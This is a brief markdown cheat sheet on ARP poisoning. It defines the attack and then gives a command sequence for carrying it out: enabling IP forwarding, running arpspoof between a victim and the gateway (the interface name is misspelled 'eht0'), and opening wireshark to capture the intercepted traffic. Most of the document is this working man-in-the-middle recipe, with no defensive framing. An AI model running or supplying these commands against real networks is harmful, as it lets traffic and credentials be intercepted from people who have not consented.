# Address Resolution Protocol

## About

Address Resolution Protocol poisoning (ARP poisoning) is a form of attack in which an attacker 
changes the Media Access Control (MAC) address and attacks an Ethernet LAN by changing the target 
computer's ARP cache with a forged ARP request and reply packets.

## Simple ARP Spoofing

> echo 1 > /proc/sys/net/ipv4/ip_forward
> cat /proc/sys/net/ipv4/ip_forward

> arpspoof -i eht0 -t [VICTIM] -r [GATEWAY IP]

# Select the correct interface
> wireshark 